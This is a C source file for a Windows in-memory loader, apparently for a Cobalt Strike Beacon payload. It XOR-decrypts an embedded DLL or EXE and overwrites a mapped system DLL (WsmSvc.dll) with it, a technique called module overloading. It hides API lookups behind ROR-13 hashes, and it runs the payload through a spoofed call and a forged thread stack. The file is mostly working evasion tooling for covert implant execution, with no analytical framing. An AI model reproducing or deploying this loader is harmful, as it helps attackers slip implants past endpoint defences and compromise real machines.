#include <winsock2.h>
#include <windows.h>
#include "tcglib/loaderdefs.h"
#include "tcglib/tcg.h"
#include "definitions.h"
#include "sleep/memory.h"
#include "draugr/spoof.h"
#include "exe_loader.h"

WINBASEAPI HANDLE   WINAPI KERNEL32$CreateFileW         (LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI BOOL     WINAPI KERNEL32$CloseHandle         (HANDLE);
WINBASEAPI BOOL     WINAPI KERNEL32$VirtualProtect      (LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI LPVOID   WINAPI KERNEL32$VirtualAlloc        (LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL     WINAPI KERNEL32$VirtualFree         (LPVOID, SIZE_T, DWORD);
WINBASEAPI HMODULE  WINAPI KERNEL32$GetModuleHandleA    (LPCSTR);
WINBASEAPI BOOLEAN  NTAPI  KERNEL32$RtlAddFunctionTable (PRUNTIME_FUNCTION, DWORD, DWORD64);

NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtCreateSection    (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtMapViewOfSection (HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtClose            (HANDLE);
NTSYSCALLAPI VOID     NTAPI NTDLL$RtlCaptureContext  (PCONTEXT);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtContinue         (PCONTEXT, BOOLEAN);
NTSYSCALLAPI void*    NTAPI NTDLL$memset             (void*, int, size_t);
NTSYSCALLAPI void*    NTAPI NTDLL$memcpy             (void*, const void*, size_t);

extern PVOID calculate_function_stack_size_wrapper(PVOID return_address);

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/* ── Execution Mode Selection ──────────────────────────────────────── */
#ifndef EXECUTION_MODE
#define EXECUTION_MODE 0   /* 0 = DLL (Beacon), 1 = EXE (Native) */
#endif

/* ── Crystal Palace embedded sections ──────────────────────────────── */

char __DLLDATA__ [0] __attribute__((section("cobalt_dll")));
char __MASKDATA__[0] __attribute__((section("cobalt_mask")));
char __PICO__    [0] __attribute__((section("pico")));

static char * findAppendedDLL() { return (char *)&__DLLDATA__;  }
static char * findMask()        { return (char *)&__MASKDATA__; }
static char * findPico()        { return (char *)&__PICO__;     }

/* ── PICO export tags ──────────────────────────────────────────────── */

int __tag_setup_hooks  ();
int __tag_setup_memory ();

typedef void ( * SETUP_HOOKS  ) ( IMPORTFUNCS   * funcs   );
typedef void ( * SETUP_MEMORY ) ( MEMORY_LAYOUT * layout  );

/* ── ROR-13 helpers ────────────────────────────────────────────────── */

#define KERNEL32DLL_HASH      0x6A4ABC5B
#define LOADLIBRARYA_HASH     0xEC0E4E8E
#define GETPROCADDRESS_HASH   0x7C0DFCAA
#define VIRTUALALLOC_HASH     0x91AFCA54
#define GETMODULEHANDLEA_HASH 0xD3324904

#define WIN32_FUNC(x) __typeof__(x) * x
typedef struct { WIN32_FUNC(LoadLibraryA); WIN32_FUNC(GetProcAddress); WIN32_FUNC(VirtualAlloc); WIN32_FUNC(GetModuleHandleA); } WIN32FUNCS;

void findNeededFunctions(WIN32FUNCS * funcs) {
    char * hModule          = (char *)findModuleByHash(KERNEL32DLL_HASH);
    funcs->LoadLibraryA     = (__typeof__(LoadLibraryA)    *) findFunctionByHash(hModule, LOADLIBRARYA_HASH);
    funcs->GetProcAddress   = (__typeof__(GetProcAddress)  *) findFunctionByHash(hModule, GETPROCADDRESS_HASH);
    funcs->VirtualAlloc     = (__typeof__(VirtualAlloc)    *) findFunctionByHash(hModule, VIRTUALALLOC_HASH);
    funcs->GetModuleHandleA = (__typeof__(GetModuleHandleA)*) findFunctionByHash(hModule, GETMODULEHANDLEA_HASH);
}

/* ── DLL Mode: Original Beacon functionality ────────────────────────── */

void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY * dll_memory )
{
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;
    DWORD                  tracked       = 0;

    section_hdr = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( int i = 0; i < section_count; i++ )
    {
        if ( !section_hdr->SizeOfRawData || !section_hdr->VirtualAddress ) {
            section_hdr++;
            continue;
        }

        section_dst  = dst + section_hdr->VirtualAddress;
        section_size = section_hdr->SizeOfRawData;
        new_protect  = 0;

        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE )
            new_protect = PAGE_WRITECOPY;
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ )
            new_protect = PAGE_READONLY;
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) )
            new_protect = PAGE_READWRITE;
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE )
            new_protect = PAGE_EXECUTE;
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) )
            new_protect = PAGE_EXECUTE_WRITECOPY;
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) )
            new_protect = PAGE_EXECUTE_READ;
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
            new_protect = PAGE_EXECUTE_READWRITE;

        KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );

        dll_memory->Sections[ tracked ].BaseAddress     = section_dst;
        dll_memory->Sections[ tracked ].Size            = section_size;
        dll_memory->Sections[ tracked ].CurrentProtect  = new_protect;
        dll_memory->Sections[ tracked ].PreviousProtect = new_protect;
        tracked++;

        section_hdr++;
    }

    dll_memory->Count = tracked;
}

BOOL LoadSacrificialDll(IN LPCWSTR szDllFilePath, OUT HMODULE * phModule) {
    HANDLE   hFile    = INVALID_HANDLE_VALUE;
    HANDLE   hSection = NULL;
    NTSTATUS status   = 0;
    PVOID    mapped   = NULL;
    SIZE_T   viewSize = 0;

    hFile = KERNEL32$CreateFileW(szDllFilePath, GENERIC_READ, FILE_SHARE_READ,
                                  NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    status = NTDLL$NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                                    NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    KERNEL32$CloseHandle(hFile);
    if (!NT_SUCCESS(status)) return FALSE;

    status = NTDLL$NtMapViewOfSection(hSection, (HANDLE)-1, &mapped,
                                       0, 0, NULL, &viewSize,
                                       ViewShare, 0, PAGE_READWRITE);
    NTDLL$NtClose(hSection);

    if (!NT_SUCCESS(status) || !mapped) return FALSE;
    *phModule = (HMODULE)mapped;
    return TRUE;
}

VOID TransferExecutionViaStack(PVOID entry_point, HINSTANCE hInstance, DWORD fdwReason) {
    PVOID kernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    PVOID ntdll    = KERNEL32$GetModuleHandleA("ntdll.dll");

    PVOID  BaseThreadInitThunk = GetProcAddress((HMODULE)kernel32, "BaseThreadInitThunk");
    PVOID  RtlUserThreadStart  = GetProcAddress((HMODULE)ntdll,    "RtlUserThreadStart");
    PVOID  btit_ret        = (PVOID)((ULONG_PTR)BaseThreadInitThunk + 0x17);
    PVOID  ruts_ret        = (PVOID)((ULONG_PTR)RtlUserThreadStart  + 0x2c);
    SIZE_T btit_stack_size = (SIZE_T)calculate_function_stack_size_wrapper(btit_ret);
    SIZE_T ruts_stack_size = (SIZE_T)calculate_function_stack_size_wrapper(ruts_ret);

    if (!btit_stack_size || !ruts_stack_size) return;

    PVOID fake_stack = KERNEL32$VirtualAlloc(NULL, 0x40000,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_READWRITE);
    if (!fake_stack) return;

    ULONG_PTR rsp = ((ULONG_PTR)fake_stack + 0x40000) & ~(ULONG_PTR)0xF;
    rsp -= 8; *(PVOID *)rsp = NULL;
    rsp -= ruts_stack_size; *(PVOID *)rsp = ruts_ret;
    rsp -= btit_stack_size; *(PVOID *)rsp = btit_ret;

    CONTEXT ctx;
    NTDLL$memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    NTDLL$RtlCaptureContext(&ctx);
    ctx.Rip = (DWORD64)entry_point;
    ctx.Rsp = (DWORD64)rsp;
    ctx.Rcx = (DWORD64)hInstance;
    ctx.Rdx = (DWORD64)fdwReason;
    ctx.R8  = 0;

    NTDLL$NtContinue(&ctx, FALSE);
}

void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
    HMODULE hSacrificial = NULL;
    DLLDATA cobaltData;
    DWORD   oldProt = 0;

    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    RESOURCE * masked_dll = (RESOURCE *)findAppendedDLL();
    RESOURCE * mask_key   = (RESOURCE *)findMask();

    char * dll_raw_src = KERNEL32$VirtualAlloc(NULL, masked_dll->len,
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE);
    if (!dll_raw_src) return;

    for (int i = 0; i < masked_dll->len; i++)
        dll_raw_src[i] = masked_dll->value[i] ^ mask_key->value[i % mask_key->len];

    ParseDLL(dll_raw_src, &cobaltData);

    if (!LoadSacrificialDll(SacrificialDllPath, &hSacrificial)) {
        KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);
        return;
    }

    PIMAGE_NT_HEADERS pSacNt = (PIMAGE_NT_HEADERS)(
        (ULONG_PTR)hSacrificial +
        ((PIMAGE_DOS_HEADER)hSacrificial)->e_lfanew);
    SIZE_T sacrificialSize = (SIZE_T)pSacNt->OptionalHeader.SizeOfImage;
    SIZE_T beaconSize      = (SIZE_T)SizeOfDLL(&cobaltData);

    if (beaconSize > sacrificialSize) {
        KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);
        return;
    }

    KERNEL32$VirtualProtect(hSacrificial, 0x1000, PAGE_READWRITE, &oldProt);

    PIMAGE_SECTION_HEADER pSacSec = IMAGE_FIRST_SECTION(pSacNt);
    for (DWORD i = 0; i < pSacNt->FileHeader.NumberOfSections; i++) {
        if (!pSacSec[i].VirtualAddress) continue;
        SIZE_T secSize = pSacSec[i].SizeOfRawData
                       ? pSacSec[i].SizeOfRawData
                       : pSacSec[i].Misc.VirtualSize;
        if (!secSize) continue;
        KERNEL32$VirtualProtect(
            (PVOID)((ULONG_PTR)hSacrificial + pSacSec[i].VirtualAddress),
            secSize, PAGE_READWRITE, &oldProt);
    }

    NTDLL$memset((char *)hSacrificial, 0, beaconSize);

    LoadDLL(&cobaltData, dll_raw_src, (char *)hSacrificial);

    char * pico_src  = findPico();
    char * pico_data = KERNEL32$VirtualAlloc(NULL, PicoDataSize(pico_src),
                                              MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                                              PAGE_READWRITE);
    char * pico_code = KERNEL32$VirtualAlloc(NULL, PicoCodeSize(pico_src),
                                              MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                                              PAGE_READWRITE);

    PicoLoad(&funcs, pico_src, pico_code, pico_data);

    DWORD old_protect;
    KERNEL32$VirtualProtect(pico_code, PicoCodeSize(pico_src),
                             PAGE_EXECUTE_READ, &old_protect);

    ((SETUP_HOOKS) PicoGetExport(pico_src, pico_code,
                                  __tag_setup_hooks()))(&funcs);
    
    ProcessImports(&funcs, &cobaltData, (char *)hSacrificial);

    MEMORY_LAYOUT memory;
    NTDLL$memset(&memory, 0, sizeof(memory));

    memory.Pico.Code       = pico_code;
    memory.Pico.Data       = pico_data;
    memory.Dll.BaseAddress = (PVOID)(char *)hSacrificial;
    memory.Dll.Size        = beaconSize;

    fix_section_permissions(&cobaltData, dll_raw_src,
                             (char *)hSacrificial, &memory.Dll);

    IMAGE_DATA_DIRECTORY * pExcept =
        &cobaltData.NtHeaders->OptionalHeader
             .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (pExcept->Size && pExcept->VirtualAddress) {
        PRUNTIME_FUNCTION pRF = (PRUNTIME_FUNCTION)(
            (ULONG_PTR)hSacrificial + pExcept->VirtualAddress);
        DWORD count = pExcept->Size / sizeof(RUNTIME_FUNCTION);
        KERNEL32$RtlAddFunctionTable(pRF, count, (DWORD64)hSacrificial);
    }

    KERNEL32$VirtualProtect(hSacrificial,
                             cobaltData.OptionalHeader->SizeOfHeaders,
                             PAGE_READONLY, &oldProt);

    ((SETUP_MEMORY) PicoGetExport(pico_src, pico_code,
                                   __tag_setup_memory()))(&memory);

    DLLMAIN_FUNC entry = EntryPoint(&cobaltData, (char *)hSacrificial);
    KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);

    FUNCTION_CALL call = { 0 };
    call.ptr     = (PVOID) entry;
    call.argc    = 3;
    call.args[0] = (ULONG_PTR) hSacrificial;
    call.args[1] = (ULONG_PTR) DLL_PROCESS_ATTACH;
    call.args[2] = (ULONG_PTR) NULL;
    spoof_call(&call);

    TransferExecutionViaStack((PVOID)entry, hSacrificial, 0x4);
}

/* ── EXE Mode: Native executable execution ────────────────────────── */

void ExecuteNativeExe(const char* exe_cmdline) {
    RESOURCE * masked_exe = (RESOURCE *)findAppendedDLL();
    RESOURCE * mask_key   = (RESOURCE *)findMask();

    char * exe_raw_src = KERNEL32$VirtualAlloc(NULL, masked_exe->len,
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE);
    if (!exe_raw_src) return;

    /* XOR-decrypt EXE */
    for (int i = 0; i < masked_exe->len; i++)
        exe_raw_src[i] = masked_exe->value[i] ^ mask_key->value[i % mask_key->len];

    /* Initialize PE context and execute */
    PE_CONTEXT ctx;
    NTDLL$memset(&ctx, 0, sizeof(ctx));
    
    execute_exe_from_memory((BYTE*)exe_raw_src, masked_exe->len, exe_cmdline, &ctx);

    /* execute_exe_from_memory never returns (calls NtContinue) */
    KERNEL32$VirtualFree(exe_raw_src, 0, MEM_RELEASE);
}

/* ── Entry point ───────────────────────────────────────────────────── */

__attribute__((noinline, no_reorder)) void go() {
#if EXECUTION_MODE == 1
    /* EXE mode: Execute native executable */
    /* Command line argument is passed via compilation */
    #ifndef EXE_CMDLINE
    #define EXE_CMDLINE ""
    #endif
    ExecuteNativeExe(EXE_CMDLINE);
#else
    /* DLL mode: Original Beacon functionality (default) */
    ModuleOverload(L"C:\\Windows\\System32\\WsmSvc.dll");
#endif
}

FARPROC resolve(DWORD modHash, DWORD funcHash) {
    HANDLE hModule = findModuleByHash(modHash);
    return findFunctionByHash(hModule, funcHash);
}
